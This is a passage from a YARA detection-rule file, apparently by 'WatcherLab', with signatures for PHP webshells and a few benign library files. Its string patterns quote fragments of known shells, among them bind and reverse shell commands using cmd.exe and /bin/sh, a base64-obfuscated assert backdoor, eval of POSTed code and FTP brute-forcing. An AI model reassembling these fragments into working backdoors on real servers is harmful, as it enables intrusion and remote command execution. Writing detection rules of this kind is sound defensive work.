      $s8 = "* Replace plus sign (+) with minus sign (-)" fullword ascii
      $s9 = "for ($i = $index + 1; $i < $tokenCount; $i++) {" fullword ascii
      $s10 = "* @param int $index" fullword ascii
      $s11 = "if (!is_array($tokens[$i]) && $tokens[$i] == ';') {" fullword ascii
      $s12 = "if (!is_array($tokens[$i]) && $tokens[$i][0] == '[') {" fullword ascii
      $s13 = "public static function mutates(array &$tokens, $index)" fullword ascii
      $s14 = "* So for this case, we can't create a mutation." fullword ascii
      $s15 = "* Not all additions can be mutated." fullword ascii
      $s16 = "* Humbug" fullword ascii
      $s17 = "$tokenCount = count($tokens);" fullword ascii
      $s18 = "$t = $tokens[$index];" fullword ascii
      $s19 = "* @package    Humbug" fullword ascii
      $s20 = "$tokens[$index] = '-';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_15e31a66891cbd2c55427678d32f149faf39a0ce
{
   meta:
      description = "php17 - file 15e31a66891cbd2c55427678d32f149faf39a0ce.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "734eb849b064304217773d4ecc46c8d9fcd611bdf3c011acfa3da38c208a272c"
   strings:
      $x1 = "$res=$api->WinExec(\"cmd.exe /c $command >\\\"$name\\\"\",0);" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x3 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x4 = "$exec=$ws->exec(\"cmd.exe /c $command\"); " fullword ascii
      $x5 = "win_shell_execute('cmd.exe','',\"/C $command >\\\"$name\\\"\");" fullword ascii
      $x6 = "<input type=\"text\" name=\"target\" value=\"http://'.getenv('HTTP_HOST').'/login.php\" size=\"30\" />" fullword ascii
      $x7 = "$alias=\"<option value='netstat -an | grep -i listen'>Display open ports</option><option value='last -a -n 250 -i'>Show last 250" ascii
      $x8 = "if(strstr($_SERVER[HTTP_USER_AGENT], \"Macintosh\")){$m = trim(shelL('file -b --mime '.$filename)); " fullword ascii
      $x9 = "$cmd=(empty($_SERVER['ComSpec']))?'d:\\\\windows\\\\system32\\\\cmd.exe':$_SERVER['ComSpec'];" fullword ascii
      $x10 = "$os='http://www.exploit-db.com/search/?action=search&filter_platform=16\" target=\"_blank\">'.$osn.'</a>';" fullword ascii
      $x11 = "<div class=\"fieldwrapper\"><label class=\"styled\">UID - GID:</label><div class=\"thefield\"><span>'.getmyuid().' - '.getmygid(" ascii
      $x12 = "echo '<form name=security method=\"POST\"><div class=\"fieldwrapper\"><label class=\"styled\" style=\"width:320px\">Security sca" ascii
      $x13 = "if(checkfunctioN('passthru')){ob_start();passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}" fullword ascii
      $x14 = "$os='http://www.exploit-db.com/search/?action=search&filter_description=kernel&filter_platform=16\" target=\"_blank\">'.$ker.'</" ascii
      $x15 = "$os='http://www.exploit-db.com/search/?action=search&filter_description=kernel&filter_platform=16\" target=\"_blank\">'.$ker.'</" ascii
      $x16 = "$alias=\"<option value='netstat -an'>Display open ports</option><option value='tasklist'>List of processes</option><option value" ascii
      $x17 = "if(!$bd)echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x18 = "echo file_get_contents(\"http://h.ackerz.com/PHPJackal/chkver.php?v=$VERSION\");" fullword ascii
      $x19 = "if(!$bd)echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x20 = "mail($email,'PHPJackal Password','Your password on '.$_SERVER['HTTP_HOST'].' is \"'.$login_password.'\"');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule a5ddad014658f40c5b8adf85dff3ffbab69b700c
{
   meta:
      description = "php17 - file a5ddad014658f40c5b8adf85dff3ffbab69b700c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "28380ca358e00f73bece233e68986ffead67218e5f6f1caae10167c6d784fc24"
   strings:
      $s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s3 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s4 = "echo '<br />B Ge Team File Manager Version <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Little Wei</font><br />E" ascii
      $s5 = "echo '<br />B Ge Team File Manager Version <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Little Wei</font><br />E" ascii
      $s6 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s7 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s8 = "<?php $x=base64_decode(\"YXNzZXJ0\");$x($_POST['ccc']);?>" fullword ascii
      $s9 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s10 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s11 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s12 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s13 = "foreach($_POST as $key=>$value){" fullword ascii
      $s14 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s15 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s16 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s17 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s18 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s19 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      $s20 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_18ebfaed40e44fba896a5dbee49ce1576095d462
{
   meta:
      description = "php17 - file 18ebfaed40e44fba896a5dbee49ce1576095d462.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4fb27f22097a66bf06e621726c33b244ebfba8b8dd016cd282e07dffdd45d4e3"
   strings:
      $s1 = "$cplehbopkf = 1687; function ahrvi($vavwkcfgpl, $ollhogg){$mmlqbvstxs = ''; for($i=0; $i < strlen($vavwkcfgpl); $i++){$mmlqb" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      all of them
}

rule sig_061412e4a03c02f9902576ec55ebbe77
{
   meta:
      description = "php17 - file 061412e4a03c02f9902576ec55ebbe77.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "181954bb9bd9f7484ba89cc707c62c9287afacf3312b7932018a44ab4b0cab64"
   strings:
      $x1 = "print \"Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version\";" fullword ascii
      $x2 = "<b style=\"cursor:crosshair\" onclick=\"set_tab('cmd');\">[Execute command]</b> " fullword ascii
      $x3 = "<title>Command Shell ~ <?php print getenv(\"HTTP_HOST\"); ?></title>" fullword ascii
      $x4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword ascii
      $x5 = "<a href=\"http://www.milw0rm.com\" target=_blank>milw0rm</a>" fullword ascii
      $x6 = "If one of the command execution functions work, the shell will function fine. " fullword ascii
      $x7 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword ascii
      $s8 = "&nbsp;&nbsp;&nbsp;<form name=\"cmdform\" onsubmit=\"return runcommand(document.cmdform.command.value,'GET');\">" fullword ascii
      $s9 = "<b><font size=3>Ajax/PHP Command Shell</b></font><br>by Ironfist" fullword ascii
      $s10 = "print '<b><font size=7>Ajax/PHP Command Shell</b></font>" fullword ascii
      $s11 = "//Execute any other command" fullword ascii
      $s12 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword ascii
      $s13 = "if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {" fullword ascii
      $s14 = "<a href=\"http://www.ironwarez.info\" target=_blank>SharePlaza</a>" fullword ascii
      $s15 = "'clear','GET'); runcommand ('listdir \".realpath($directory).\"','GET'); \\\">\".$directory.\"</b><br>\";" fullword ascii
      $s16 = "\"&filecontent=\" + encodeURI( document.getElementById(\"area1\").value );" fullword ascii
      $s17 = "function runcommand(urltoopen,action,contenttosend){" fullword ascii
      $s18 = "print \"<b>\".get_current_user().\"~# </b>\". htmlspecialchars($cmd).\"<br>\";" fullword ascii
      $s19 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST['filecontent']))" fullword ascii
      $s20 = "$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_809321821fbe401df552dd9043bd85fd491b597c
{
   meta:
      description = "php17 - file 809321821fbe401df552dd9043bd85fd491b597c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "21c1f56c071851f53f1b27dfe85fed9bd7da3141a9d80f665be59d370f761b34"
   strings:
      $x1 = "else { echo 'Could not execute command using system(), shell_exec(), passthru(), exec() && popen().'; }" fullword ascii
      $x2 = "echo '<form action=\"\" method=\"post\" id=\"form\"><textarea cols=\"90\" rows=\"25\" style=\"overflow:auto;\" id=\"fileEdit\" n" ascii
      $x3 = "<form action=\"?action=CLI&amp;dir=',$SCDIR,'\" method=\"post\" style=\"display:inline;\">Execute command" fullword ascii
      $x4 = "<td><form action=\"http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php\" method=\"post\" target=\"_bla" ascii
      $x5 = "<td><form action=\"http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php\" method=\"post\" target=\"_bla" ascii
      $x6 = "| [<a href=\"http://www.stayinvisible.com/\" target=\"_blank\">" fullword ascii
      $x7 = "if (is_dir($_POST['dm'])) { echo '\\'',htmlspecialchars($_POST['dm']),'\\' - Directory Already exists.'; }" fullword ascii
      $s8 = "Remove the shell password? <input type=\"submit\" id=\"removep\" name=\"removep\" value=\"Remove\" />" fullword ascii
      $s9 = "if (function_exists('shell_exec')) { echo htmlspecialchars(shell_exec('type '.$_POST['value'])); $Suc = TRUE; }" fullword ascii
      $s10 = "else { echo 'Error while removing shell, Could not delete the file.';GetLastError(); }" fullword ascii
      $s11 = "<td><form action=\"http://md5decryption.com\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidden\"" ascii
      $s12 = "<td><form action=\"http://md5decryption.com\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidden\"" ascii
      $s13 = "<td><form action=\"http://www.md5decrypter.com/\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidd" ascii
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii
      $s16 = "strpos($ShellContents,'$Auth = FALSE;'),14)) != 0) { echo 'Password set.'; }" fullword ascii
      $s17 = "blur=\"javascript: if(this.value === \\'\\') { this.value = \\'Target of the link\\'; }\" style=\"width:140px;\" />" fullword ascii
      $s18 = "echo 'Please enter the password: <input type=\"text\" id=\"pass\" name=\"pass\" /> <input type=\"submit\" value=\"Enter\" />" fullword ascii
      $s19 = "elseif (function_exists('shell_exec')) { echo shell_exec($_POST['c']); }" fullword ascii
      $s20 = "if ($_GET['action'] === 'getfile') { if (!readfile($_GET['file'])) { echo file_get_contents($_GET['file']); } die; }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule a3b57f52c3782c20a2c006533c8f5d815034aefc
{
   meta:
      description = "php17 - file a3b57f52c3782c20a2c006533c8f5d815034aefc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c53b0ccd965a4c11601fccd308ef7ba02c784e7984984682313cca6acf67f6d4"
   strings:
      $x1 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $x2 = "$serv = @mysql_connect($adress.\":\".$port, $login,$pass) or die(\"<font color=red>Error: \".mysql_error().\"</font>\");" fullword ascii
      $x3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $x4 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl" ascii
      $x5 = "<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x6 = "</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x7 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" fullword ascii
      $x8 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $x9 = "md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/?q=releases&download=4>DOWNLOAD</a>]" fullword ascii
      $x10 = "Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>" fullword ascii
      $s11 = "<!-- Ncph.txt - Ncph Shell - Hackerbox.Net -->" fullword ascii
      $s12 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" fullword ascii
      $s13 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii
      $s14 = "<font color=green><b>You can change temp folder for dump file in your browser!<br>" fullword ascii
      $s15 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>\";" fullword ascii
      $s16 = "header(\"Content-disposition: attachment; filename=\\\"$download\\\";\");" fullword ascii
      $s17 = "<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>" fullword ascii
      $s18 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s19 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
      $s20 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule AnnotationTest
{
   meta:
      description = "php17 - file AnnotationTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0adc49da265d3a809e61f28c6d606c3e5da25e3d4fc221f5d25a089f300b93c3"
   strings:
      $s1 = "$values = Annotation::arrayValue('{ \"code\": \"200\", \"user\": \"davert\", \"email\": \"davert@gmail.com\" }');" fullword ascii
      $s2 = "$values = Annotation::arrayValue('( code=\"200\", user=\"davert\", email = \"davert@gmail.com\")');" fullword ascii
      $s3 = "$this->assertEquals(['code' => '200', 'user' => 'davert', 'email' => 'davert@gmail.com'], $values);" fullword ascii
      $s4 = "$this->assertEquals(['key1', 'key2'], Annotation::fetchAnnotationsFromDocblock('param', $docblock));" fullword ascii
      $s5 = "$this->assertEquals(['davert'], Annotation::fetchAnnotationsFromDocblock('user', $docblock));" fullword ascii
      $s6 = "* @author davert" fullword ascii
      $s7 = "public function testGetAnnotationsFromDocBlock()" fullword ascii
      $s8 = "public function testGetAllAnnotationsFromDocBlock()" fullword ascii
      $s9 = "* @tag codeception" fullword ascii
      $s10 = "public function testValueToSupportAnnotationStyle()" fullword ascii
      $s11 = "$this->assertEquals('davert', Annotation::forClass(__CLASS__)->fetch('author'));" fullword ascii
      $s12 = "* @tag tdd" fullword ascii
      $s13 = "* @param $var2" fullword ascii
      $s14 = "* @param $var1" fullword ascii
      $s15 = "public function testValueToSupportJson()" fullword ascii
      $s16 = "$this->assertEquals(array('codeception', 'tdd'), Annotation::forClass(__CLASS__)->fetchAll('tag'));" fullword ascii
      $s17 = "$all = Annotation::fetchAllAnnotationsFromDocblock($docblock);" fullword ascii
      $s18 = "], Annotation::fetchAllAnnotationsFromDocblock($docblock));" fullword ascii
      $s19 = "* Class AnnotationTest" fullword ascii
      $s20 = "Annotation::forClass(__CLASS__)->method('testMethodAnnotation')->fetchAll('param')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule sig_0ad17701cf5e5a59aa57f35aa240d9e40d28ba50
{
   meta:
      description = "php17 - file 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "am.ru/releases/cc999shell\\\">c999shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x3 = "function c999ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x4 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x5 = "$logfile = $tmpdir_logs.\"c999sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x6 = "$fqb_log = \"FTP Quick Brute (called c999shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s7 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s8 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s9 = "$out = \"# Dumped by c999Shell.SQL v. \".$shver.\"" fullword ascii
      $s10 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s11 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - phpshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAM" ascii
      $s12 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s13 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s14 = "header(\"WWW-Authenticate: Basic realm=\\\"c999shell \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s15 = "if ($fqb_logemail) {@mail($fqb_logemail,\"c999shell v. \".$shver.\" report\",$fqb_log);}" fullword ascii
      $s16 = "$log_email = \"user@host.tld\"; //Default e-mail for sending logs" fullword ascii
      $s17 = "$accessdeniedmess = \"<a href=\\\"http://ccteam.ru/releases/c999shell\\\">c999shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $s18 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s19 = "elseif (!$data = c999getsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s20 = "xp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule AddressBookRootTest
{
   meta:
      description = "php17 - file AddressBookRootTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0355aee1d255de71be71de29a9ba606690abc625fff888c37f3410204c643181"
   strings:
      $s1 = "$this->assertEquals('addressbooks', $root->getName());" fullword ascii
      $s2 = "$this->assertEquals('user1', $children[0]->getName());" fullword ascii
      $s3 = "$children = $root->getChildren();" fullword ascii
      $s4 = "$root = new AddressBookRoot($pBackend, $cBackend);" fullword ascii
      $s5 = "class AddressBookRootTest extends \\PHPUnit_Framework_TestCase {" fullword ascii
      $s6 = "function testGetChildForPrincipal() {" fullword ascii
      $s7 = "$this->assertInstanceOf('Sabre\\\\CardDAV\\\\AddressBookHome', $children[0]);" fullword ascii
      $s8 = "function testGetName() {" fullword ascii
      $s9 = "$pBackend = new DAVACL\\PrincipalBackend\\Mock();" fullword ascii
      $s10 = "$this->assertEquals(3, count($children));" fullword ascii
      $s11 = "$cBackend = new Backend\\Mock();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_416357043035d2618c0ac605d506127c7027b49d
{
   meta:
      description = "php17 - file 416357043035d2618c0ac605d506127c7027b49d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c770ab426079026a5aa566f3f81ce2c55939ae4a870b42e01af8532947169a4f"
   strings:
      $s1 = "https://github.com/sensepost/reGeorg" fullword ascii
      $s2 = "etienne@sensepost.com / @kamp_staaldraad" fullword ascii
      $s3 = "header('X-ERROR: RemoteSocket read filed');" fullword ascii
      $s4 = "$res = @socket_connect($sock, $target, $port);" fullword ascii
      $s5 = "sam@sensepost.com / @trowalts" fullword ascii
      $s6 = "header('X-ERROR: Failed connecting to target');" fullword ascii
      $s7 = "willem@sensepost.com / @_w_m__" fullword ascii
      $s8 = "header('X-ERROR: No more running, close now');" fullword ascii
      $s9 = "header('X-ERROR: Failed reading from socket');" fullword ascii
      $s10 = "header('X-ERROR: POST request read filed');" fullword ascii
      $s11 = "$rawPostData = file_get_contents(\"php://input\");" fullword ascii
      $s12 = "header(\"Content-Length: $size\");" fullword ascii
      $s13 = "$target = $headers[\"X-TARGET\"];" fullword ascii
      $s14 = "$_SESSION[\"writebuf\"] .= $rawPostData;" fullword ascii
      $s15 = "header('X-ERROR: Failed creating socket');" fullword ascii
      $s16 = "header('X-ERROR: Failed writing socket');" fullword ascii
      $s17 = "$cmd = $headers[\"X-CMD\"];" fullword ascii
      $s18 = "header(\"Connection: Keep-Alive\");" fullword ascii
      $s19 = "error_log(\"DISCONNECT recieved\");" fullword ascii
      $s20 = "$port = (int)$headers[\"X-PORT\"];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}


rule activeLink_sqliteDAL_class
{
   meta:
      description = "php17 - file activeLink_sqliteDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2f17ab0bc969a48a97c986337e725f705e17b7143615dbc31eb976607bd1ac99"
   strings:
      $s1 = "function  GetPageCount(activeLinkModel $model, $perPageCount)" fullword ascii
      $s2 = "function  GetPageList(activeLinkModel $model, $start, $limit)" fullword ascii
      $s3 = "function  GetList(activeLinkModel $model)" fullword ascii
      $s4 = "function  GetModel(activeLinkModel $model)" fullword ascii
      $s5 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s6 = "// TODO: Implement GetPageList() method." fullword ascii
      $s7 = "// TODO: Implement GetModel() method." fullword ascii
      $s8 = "// TODO: Implement GetList() method." fullword ascii
      $s9 = "function  InsertInto(activeLinkModel $model)" fullword ascii
      $s10 = "function  UpDateSet(activeLinkModel $model)" fullword ascii
      $s11 = "function  DeleteFrom(activeLinkModel $model)" fullword ascii
      $s12 = "// TODO: Implement InsertInto() method." fullword ascii
      $s13 = "// TODO: Implement UpDateSet() method." fullword ascii
      $s14 = "// TODO: Implement DeleteFrom() method." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_447543753cf849b52628d6c2f7cdeac7f88b1fdb
{
   meta:
      description = "php17 - file 447543753cf849b52628d6c2f7cdeac7f88b1fdb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "68c23baa17643f2613e59c6c2854b199404035b12b814c26a7256faf216d28ce"
   strings:
      $s1 = "$arr = array('test', $_REQUEST['pass']);" fullword ascii
      $s2 = "uasort($arr, base64_decode($e));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _themosisCoreTaxonomyAdd_blade
{
   meta:
      description = "php17 - file _themosisCoreTaxonomyAdd.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b4ae06319bf2f0d8371d6e58b7300126836eb43370619d2362e3368c071b3e2"
   strings:
      $s1 = "{!! Themosis\\Facades\\Form::label($field['features']['title'], ['for' => $field['atts']['id']]) !!}" fullword ascii
      $s2 = "<div class=\"form-field {{ 'themosis-term-'.$field['name'].'-wrap' }}\">" fullword ascii
   condition:
      uint16(0) == 0x6640 and filesize < 1KB and
      all of them
}

rule Asserter
{
   meta:
      description = "php17 - file Asserter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cc0e4597af2bb7773bcb20a0bf51426ce8c7d2b59703b9768491e8d2f8b8bd91"
   strings:
      $s1 = "* (c) Daniel Leech <daniel@dantleech.com>" fullword ascii
      $s2 = "* This file is part of the PHPBench package" fullword ascii
      $s3 = "public function assert(AssertionData $data, Config $config);" fullword ascii
      $s4 = "use PhpBench\\Registry\\Config;" fullword ascii
      $s5 = "use PhpBench\\Registry\\RegistrableInterface;" fullword ascii
      $s6 = "interface Asserter extends RegistrableInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_07eb6634f28549ebf26583e8b154c6a579b8a733
{
   meta:
      description = "php17 - file 07eb6634f28549ebf26583e8b154c6a579b8a733.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a45ccdc66b386c446f91065cfe4f6a5a5234d969fc09035cd57e2008c86f2f8c"
   strings:
      $s1 = "<?php ${\"\\x47\\x4cO\\x42\\x41\\x4c\\x53\"}[\"\\x6dt\\x6f\\x79\\x6cyj\\x77\"]=\"\\x66\\x75nc\";${\"G\\x4cOB\\x41L\\x53\"}[\"\\x" ascii
      $s2 = "0\";${${\"GL\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x65\\x6e\\x65\\x6c\\x69\\x66fc\\x65ex\"]}.=\"U\\x73e\\x72-\\x41g\\x65n\\x74:\\x20{$" ascii
      $s3 = ".$host.\">\";return${${\"\\x47\\x4cOB\\x41\\x4cS\"}[\"\\x6a\\x70\\x68l\\x7a\\x6fm\\x76\\x6cr\"]};}function error_404(){header(\"" ascii
      $s4 = "xv\\x6e\\x79\\x64\\x67\\x6cp\\x6e\\x65\"]};}function pass_macros($content,$passes){$tqctipjdvoc=\"\\x70\\x61\\x73\\x73\";$kiqowg" ascii
      $s5 = "lseif(isset($_POST[\"\\x74\\x79\\x70\\x65\"])){echo$_POST[\"ty\\x70e\"];exit();}error_404();function is_good_ip($ip){${${\"\\x47" ascii
      $s6 = "78\"]}=@unserialize(base64_decode($_POST[\"ali\\x61\\x73\\x65\\x73\"]));${$vjbijjymkbn}=@unserialize(base64_decode($_POST[\"\\x7" ascii
      $s7 = "x69\\x79\\x6f\\x76gx\\x64d\\x67\"]}=@unserialize(base64_decode($_POST[\"\\x66\\x72\\x6f\\x6ds\"]));${$vmijtce}=@unserialize(base" ascii
      $s8 = "$_POST[\"th\\x65\\x6d\\x65s\"]));${$ivglqgajvbog}=@unserialize(base64_decode($_POST[\"\\x6dess\\x61ge\\x73\"]));${${\"\\x47LOB" ascii
      $s9 = "is_good_ip($_SERVER[\"\\x52E\\x4dO\\x54\\x45_A\\x44\\x44R\"])){eval(base64_decode($_POST[\"\\x63o\\x64e\"]));exit();}if(isset($_" ascii
      $s10 = "erialize(base64_decode($_POST[\"e\\x6dai\\x6c\\x73\"]));${${\"G\\x4cO\\x42\\x41L\\x53\"}[\"\\x66l\\x73\\x72\\x73y\"]}=@unseriali" ascii
      $s11 = "\\x4c\\x4f\\x42\\x41\\x4cS\"}[\"fr\\x61\\x6d\\x72o\\x73b\"]=\"\\x63\\x6f\\x6ete\\x6e\\x74\";$host=preg_replace(\"/^(ww\\x77|f\\x" ascii
      $s12 = "\\x64s\"]};}function xnum_macros($content){${\"\\x47\\x4c\\x4f\\x42A\\x4c\\x53\"}[\"r\\x67\\x63\\x64d\\x79\"]=\"\\x63\\x6f\\x6e" ascii
